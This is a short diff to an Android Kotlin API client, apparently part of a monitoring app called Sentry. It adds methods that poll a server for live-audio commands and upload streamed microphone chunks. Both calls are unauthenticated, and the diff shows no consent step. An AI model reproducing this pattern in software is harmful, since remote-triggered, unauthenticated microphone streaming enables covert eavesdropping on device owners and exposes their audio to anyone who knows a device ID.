@@ -94,6 +94,28 @@ class SentryApiClient(
         }
     }
 
+    suspend fun pollLiveAudioCommand(): Result<JSONObject> = withContext(Dispatchers.IO) {
+        val deviceId = CryptoManager.getOrCreateDeviceId(context)
+        request("GET", "/audio/live/command/$deviceId", null, authenticated = false)
+    }
+
+    suspend fun uploadLiveAudioChunk(
+        deviceId: String,
+        base64: String?,
+        decibels: Int,
+        micStatus: String,
+        sequence: Int
+    ): Result<JSONObject> = withContext(Dispatchers.IO) {
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            if (base64 != null) put("base64", base64)
+            put("decibels", decibels)
+            put("micStatus", micStatus)
+            put("sequence", sequence)
+        }
+        post("/audio/live/chunk", body, authenticated = false)
+    }
+
     suspend fun uploadAudio(name: String, duration: String, size: String, base64: String): Result<JSONObject> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         val body = JSONObject().apply {
